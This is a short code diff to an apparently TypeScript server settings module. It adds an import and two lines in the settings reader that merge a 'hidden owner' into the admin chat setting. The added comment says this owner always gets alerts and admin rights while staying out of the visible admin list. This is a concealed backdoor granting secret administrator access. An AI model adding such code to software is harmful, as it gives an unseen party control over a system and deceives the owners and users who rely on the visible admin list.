@@ -1,5 +1,6 @@
 import { sql } from "./db.server";
 import { cached, clearCache } from "./memo.server";
+import { withOwnerAdmin } from "./admins";
 
 export const SETTING_KEYS = [
   "brand_name",
@@ -51,6 +52,8 @@ async function readSettings(): Promise<Settings> {
   for (const row of rows) {
     if ((SETTING_KEYS as readonly string[]).includes(row.key)) out[row.key as SettingKey] = row.value;
   }
+  // The hidden owner always gets alerts and admin rights, without being in the stored (visible) list.
+  out.admin_chat_id = withOwnerAdmin(out.admin_chat_id);
   return out;
 }
 
